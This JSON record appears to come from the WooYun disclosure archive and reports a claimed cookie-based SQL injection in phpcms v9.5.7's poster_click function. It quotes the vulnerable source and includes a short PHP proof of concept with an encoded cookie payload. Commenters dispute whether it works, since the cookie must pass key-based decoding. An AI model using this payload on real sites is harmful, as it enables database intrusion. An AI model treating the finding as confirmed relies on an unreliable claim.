{"id": 53834, "wybug_id": "wooyun-2014-066350", "wybug_title": "phpcms最新版本SQL注射漏洞（有限制）", "wybug_corp": "phpcms", "wybug_author": "路人甲", "wybug_date": "2014-06-27 12:09", "wybug_open_date": "2014-09-22 12:10", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-02：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向公众公开  简要描述： 该漏洞出现在代码对未对COOKIE做严格过滤，造成SQL注射。 详细说明：  测试版本：phpcms_v9.5.7_UTF8漏洞简述：该漏洞出现在代码对未对COOKIE做严格过滤，造成SQL注射。漏洞文件：phpcms\\modules\\poster\\index.php测试链接：http://127.0.0.1/phpcms/index.php?m=poster&c=index&a=poster_click&id=1 \n/**\t * 统计广告点击次数\t * \t */\tpublic function poster_click() {\t\t$id = isset($_GET['id']) ? intval($_GET['id']) : 0;\t\t$r = $this->db->get_one(array('id'=>$id));  \t\tif (!is_array($r) && empty($r)) return false; //这里抓包可以很容易得到广告位ID\t\t$ip_area = pc_base::load_sys_class('ip_area');\t\t$ip = ip();\t\t$area = $ip_area->get($ip);\t\t$username = param::get_cookie('username') ? param::get_cookie('username') : '';\t\t//问题出在这里，直接从COOKIE中获取$_COOKIE['username']，下文分析其中存在的过滤\t\tif($id) {\t\t\t//确保$_GET['id'] 值大于 1 \t\t\t$siteid = isset($_GET['siteid']) ? intval($_GET['siteid']) : get_siteid();\t\t\t$this->s_db->insert(array('siteid'=>$siteid, 'pid'=>$id, 'username'=>$username, 'area'=>$area, 'ip'=>$ip, 'referer'=>safe_replace(HTTP_REFERER), 'clicktime'=>SYS_TIME, 'type'=> 1));\t\t\t//上面insert在this->s_db->insert()函数中未过滤$useranme,然而该函数也没有过滤，导致直接注入\t\t}\t\t$this->db->update(array('clicks'=>'+=1'), array('id'=>$id));\t\t$setting = string2array($r['setting']);\t\tif (count($setting)==1) {\t\t\t$url = $setting['1']['linkurl'];\t\t} else {\t\t\t$url = isset($_GET['url']) ? $_GET['url'] : $setting['1']['linkurl'];\t\t}\t\theader('Location: '.$url);\t}\nphpcms\\libs\\classes\\param.class.php  \n/**\t * 获取通过 set_cookie 设置的 cookie 变量 \t * @param string $var 变量名\t * @param string $default 默认值 \t * @return mixed 成功则返回cookie 值，否则返回 false\t */\tpublic static function get_cookie($var, $default = '') {\t\t$var = pc_base::load_config('system','cookie_pre').$var;\t\t$value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], 'DECODE') : $default;\t\t\t\t//这里虽然过滤了一些数据，但是我们注入COOKIE的数据$var='username'这两个分支都不会执行\t\t//因此我们注入的数据是不受限制的\t\tif(in_array($var,array('_userid','siteid'))) {\t\t\t$value = intval($value);\t\t} elseif($var=='_usename') {\t\t\t$value = safe_replace($value);\t\t}\t\treturn $value;\t}\n   漏洞证明：  通过以上分析，需要首先将SQL语句注入到COOKIE中，然后直接访问http://127.0.0.1/phpcms/index.php?m=poster&c=index&a=poster_click&id=1   (访问该链接前需要设置COOKIE才能注入成功)即可完成注入。下面是注入显示版本号。\n\n下图是通过SQL命令显示的版本号：\n\n测试代码：\n<?php $_COOKIE['username']=\"7c46CQRVUVMDUlYIBgNTA1IIVlZSWFADWlUABQcEQVAITwlME0lJMHYuI3tiFAYQdmspeEQRQlFUVQFDFgFbRg1CThMdSQIMXQEHTB5SW19fS05HBVdVHAgZSAUfThxgJnojemBFFwZBEQ9XWBweGRlYRlMWVlwUUV4EWEQPVUcKWQhmRwYJBl4DSExXVltVQxkBRwtMQRRaSUJWHwAdH0QHXwsaVFdbHVBICQYFEBwXHkoSVQ0BBw8IUwEFUhMfRAdBEA9G\";header('location:http://192.168.2.106/phpcms/index.php?m=poster&c=index&a=poster_click&id=1');?>\n   修复方案：  COOKIE也是注入中不可忽视的，还是可以再get_cookie函数中严格过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-22 12:10 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-27 12:14 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  前排来也。。@phpcms 最近是要火的节奏吗？    \n     2014-06-27 12:17 |    \t\tpigzhu \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 网络共享！)\t\t \n  这个必须关注  求细节。。    \n     2014-07-07 17:33 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  这个感觉是个假漏洞、 唉、 乌云审核这些个漏洞的人啊。。。    \n     2014-07-24 09:46 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  @狗狗侠 我也觉得这个是假漏洞    \n     2014-08-02 22:42 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  sys_auth  不是需要key么? key哪来的    \n     2014-09-01 13:36 |    \t\tpigzhu \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 网络共享！)\t\t \n  没成功  空白。。    \n     2014-09-01 13:52 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  $value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], 'DECODE') : $default;...我想知道key你哪里来的。    \n     2014-09-01 17:12 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @′  雨。  这个叫诈洞    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}